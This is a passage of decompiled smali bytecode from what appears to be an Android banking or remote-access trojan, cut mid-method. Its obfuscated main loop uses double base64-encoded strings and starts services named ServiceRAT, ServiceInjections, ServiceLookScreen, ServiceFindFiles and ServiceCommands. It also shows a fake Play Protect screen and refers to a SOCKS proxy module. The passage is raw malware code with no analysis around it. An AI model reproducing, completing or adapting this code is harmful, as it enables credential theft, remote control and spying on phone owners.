    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_356

    const-string v6, "TGc9PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_356

    const-string v6, "ZFhKcw=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v1, v6, v0}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v1, v6, v0}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "YVhOWGIzSnJhVzVu"

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v1, v0, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_337
    .catch Ljava/lang/Exception; {:try_start_2bb .. :try_end_337} :catch_356

    goto :goto_356

    :cond_338
    :goto_338
    move-object/from16 v22, v6

    move/from16 v24, v14

    move/from16 v21, v15

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v6, Lnaqsl/ebxcb/exu/StartWhileRequest;

    invoke-virtual {v8, v0, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_356

    :try_start_348
    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    iget-object v11, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v13, Lnaqsl/ebxcb/exu/StartWhileRequest;

    invoke-direct {v6, v11, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_356
    .catch Ljava/lang/Exception; {:try_start_348 .. :try_end_356} :catch_356

    :catch_356
    :cond_356
    :goto_356
    :try_start_356
    invoke-virtual {v8, v1}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_38d

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v6, "YzJGMlpWOXBibW89"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v0, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v6, 0x5

    if-lt v0, v6, :cond_38d

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v6, Lnaqsl/ebxcb/exu/ServiceInjections;

    invoke-virtual {v8, v0, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_38d

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    iget-object v11, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v13, Lnaqsl/ebxcb/exu/ServiceInjections;

    invoke-direct {v6, v11, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_38b
    .catch Ljava/lang/Exception; {:try_start_356 .. :try_end_38b} :catch_38c

    goto :goto_38d

    :catch_38c
    nop

    :cond_38d
    :goto_38d
    if-nez v9, :cond_3bf

    :try_start_38f
    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v6, Lnaqsl/ebxcb/exu/ServiceLookScreen;

    invoke-virtual {v8, v0, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_3bf

    const-string v0, "Ykc5dmEzTmpjbVZsYmc9PQ=="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v1, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3bf

    new-instance v0, Landroid/content/Intent;

    iget-object v6, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v11, Lnaqsl/ebxcb/exu/ServiceLookScreen;

    invoke-direct {v0, v6, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v0}, Landroid/app/IntentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_3bd
    .catch Ljava/lang/Exception; {:try_start_38f .. :try_end_3bd} :catch_3be

    goto :goto_3bf

    :catch_3be
    nop

    :cond_3bf
    :goto_3bf
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x1a

    if-lt v0, v6, :cond_3f2

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-virtual {v0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    iget-object v6, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_406

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v6, Lnaqsl/ebxcb/exu/ServicePedometer;

    invoke-virtual {v8, v0, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_406

    :try_start_3e3
    new-instance v0, Landroid/content/Intent;

    iget-object v6, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v11, Lnaqsl/ebxcb/exu/ServicePedometer;

    invoke-direct {v0, v6, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    :goto_3ec
    invoke-virtual {v1, v0}, Landroid/app/IntentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_3ef
    .catch Ljava/lang/Exception; {:try_start_3e3 .. :try_end_3ef} :catch_3f0

    goto :goto_406

    :catch_3f0
    nop

    goto :goto_406

    :cond_3f2
    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v6, Lnaqsl/ebxcb/exu/ServicePedometer;

    invoke-virtual {v8, v0, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_406

    :try_start_3fc
    new-instance v0, Landroid/content/Intent;

    iget-object v6, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v11, Lnaqsl/ebxcb/exu/ServicePedometer;

    invoke-direct {v0, v6, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    :try_end_405
    .catch Ljava/lang/Exception; {:try_start_3fc .. :try_end_405} :catch_3f0

    goto :goto_3ec

    :cond_406
    :goto_406
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x14

    if-lt v0, v6, :cond_541

    :try_start_40c
    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    iget v0, v0, Lnaqsl/ebxcb/exu/ifdf;->char:I

    if-lt v12, v0, :cond_47d

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    iget-boolean v0, v0, Lnaqsl/ebxcb/exu/ifdf;->case:Z

    if-eqz v0, :cond_47d

    const/16 v0, 0xb

    if-eq v10, v0, :cond_420

    const/16 v0, 0xc

    if-ne v10, v0, :cond_47d

    :cond_420
    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v1, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v6, "WlhKeWIzST0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_47d

    new-instance v0, Ljava/io/File;

    const-string v6, "V1ZoQ2NnPT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const/4 v11, 0x0

    invoke-virtual {v1, v6, v11}, Landroid/app/IntentService;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v6

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v13, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    invoke-virtual {v13}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual {v11, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, "TG1Gd2F3PT0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v11, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-direct {v0, v6, v11}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_47d

    invoke-virtual {v8, v1}, Lnaqsl/ebxcb/exu/int;->for(Landroid/content/Context;)V
    :try_end_47b
    .catch Ljava/lang/Exception; {:try_start_40c .. :try_end_47b} :catch_47c

    goto :goto_47d

    :catch_47c
    nop

    :cond_47d
    :goto_47d
    if-nez v9, :cond_541

    const/16 v0, 0xf

    if-eq v10, v0, :cond_487

    const/16 v0, 0x10

    if-ne v10, v0, :cond_541

    :cond_487
    :try_start_487
    invoke-virtual {v8, v1}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_541

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    iget v0, v0, Lnaqsl/ebxcb/exu/ifdf;->char:I

    if-lt v12, v0, :cond_541

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    iget-boolean v0, v0, Lnaqsl/ebxcb/exu/ifdf;->case:Z

    if-eqz v0, :cond_541

    new-instance v0, Ljava/io/File;

    const-string v6, "V1ZoQ2NnPT0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const/4 v9, 0x0

    invoke-virtual {v1, v6, v9}, Landroid/app/IntentService;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v6

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v11, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo:Lnaqsl/ebxcb/exu/ifdf;

    invoke-virtual {v11}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v11, "TG1Gd2F3PT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v0, v6, v9}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0
    :try_end_4d3
    .catch Ljava/lang/Exception; {:try_start_487 .. :try_end_4d3} :catch_540

    if-eqz v0, :cond_528

    :try_start_4d5
    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v1, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v6, "WkVoS01WcFJQVDA9"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_509

    new-instance v0, Landroid/content/Intent;

    const-class v6, Lnaqsl/ebxcb/exu/Activity/ActivityPlayProtect;

    invoke-direct {v0, v1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v6, 0x10000000

    invoke-virtual {v0, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v6, 0x40000000    # 2.0f

    invoke-virtual {v0, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_509
    .catch Ljava/lang/Exception; {:try_start_4d5 .. :try_end_509} :catch_509

    :catch_509
    :cond_509
    :try_start_509
    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v8, v1, v0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v6, "WlhKeWIzST0="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_528

    invoke-virtual {v8, v1}, Lnaqsl/ebxcb/exu/int;->for(Landroid/content/Context;)V
    :try_end_528
    .catch Ljava/lang/Exception; {:try_start_509 .. :try_end_528} :catch_528

    :catch_528
    :cond_528
    :try_start_528
    const-string v0, "UkdWNFUyOWphM05OYjJSMWJHVT0="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v6, "ZVdWeg=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v1, v0, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_53f
    .catch Ljava/lang/Exception; {:try_start_528 .. :try_end_53f} :catch_540

    goto :goto_541

    :catch_540
    nop

    :cond_541
    :goto_541
    const/16 v0, 0xd

    if-ge v10, v0, :cond_55a

    const/16 v0, 0xa

    if-lt v10, v0, :cond_55a

    :try_start_549
    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v12}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v1, v0, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_558
    .catch Ljava/lang/Exception; {:try_start_549 .. :try_end_558} :catch_559

    goto :goto_55a

    :catch_559
    nop

    :cond_55a
    :goto_55a
    const/16 v0, 0x32

    if-lt v10, v0, :cond_5f4

    add-int/lit8 v12, v12, 0x19

    :try_start_560
    invoke-static {v7}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v12}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v1, v0, v6}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_56f
    .catch Ljava/lang/Exception; {:try_start_560 .. :try_end_56f} :catch_5f4

    :try_start_56f
    invoke-direct/range {p0 .. p0}, Lnaqsl/ebxcb/exu/StartWhileGlobal;->fddo()V

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v6, Lnaqsl/ebxcb/exu/ServiceRAT;

    invoke-virtual {v8, v0, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_5a0

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v6, "ZDJWaWMyOWphMlYw"

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v8, v0, v6}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_5a0

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    new-instance v6, Landroid/content/Intent;

    iget-object v9, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v10, Lnaqsl/ebxcb/exu/ServiceRAT;

    invoke-direct {v6, v9, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_5a0
    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->for:Lnaqsl/ebxcb/exu/for;

    iget-object v0, v0, Lnaqsl/ebxcb/exu/for;->for:[Ljava/lang/String;
    :try_end_5a4
    .catch Ljava/lang/Exception; {:try_start_56f .. :try_end_5a4} :catch_5f2

    const/4 v6, 0x0

    :try_start_5a5
    aget-object v0, v0, v6

    invoke-virtual {v8, v1, v0}, Lnaqsl/ebxcb/exu/int;->for(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_5f0

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v9, Lnaqsl/ebxcb/exu/ServiceFindFiles;

    invoke-virtual {v8, v0, v9}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_5f0

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v9, "Wm1sdVpHWnBiR1Z6"

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v0, v9}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v9

    const/4 v10, 0x1

    if-le v9, v10, :cond_5f0

    const-string v9, "UzJsd2JWbFhlSHBhVTI5eA=="

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_5f0

    iget-object v0, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    new-instance v9, Landroid/content/Intent;

    iget-object v10, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v11, Lnaqsl/ebxcb/exu/ServiceFindFiles;

    invoke-direct {v9, v10, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v9}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_5f0
    .catch Ljava/lang/Exception; {:try_start_5a5 .. :try_end_5f0} :catch_5f0

    :catch_5f0
    :cond_5f0
    :goto_5f0
    const/4 v10, 0x0

    goto :goto_5f5

    :catch_5f2
    const/4 v6, 0x0

    goto :goto_5f0

    :catch_5f4
    :cond_5f4
    const/4 v6, 0x0

    :goto_5f5
    move v11, v10

    const/4 v9, 0x1

    add-int/lit8 v10, v24, 0x1

    add-int/lit8 v0, v21, 0x1

    move/from16 v13, v16

    :try_start_5fd
    div-int/lit16 v14, v13, 0x3e8

    add-int/2addr v14, v9

    if-lt v10, v14, :cond_65a

    iget-object v9, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-static/range {v22 .. v22}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v8, v9, v14}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v16
    :try_end_614
    .catch Ljava/lang/Exception; {:try_start_5fd .. :try_end_614} :catch_65a

    :try_start_614
    iget-object v9, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    invoke-virtual {v8, v9}, Lnaqsl/ebxcb/exu/int;->catch(Landroid/content/Context;)Z

    move-result v9

    if-eqz v9, :cond_62b

    iget-object v9, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    new-instance v13, Landroid/content/Intent;

    iget-object v14, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-class v15, Lnaqsl/ebxcb/exu/ServiceCommands;

    invoke-direct {v13, v14, v15}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v9, v13}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_658

    :cond_62b
    iget-object v9, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v13, "YVhOU1pXTnZibTVsWTNSbFpBPT0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v8, v9, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v9, v13}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_658

    iget-object v9, v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;->try:Landroid/content/Context;

    const-string v13, "YVhOU1pXTnZibTVsWTNSbFpBPT0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static/range {v18 .. v18}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

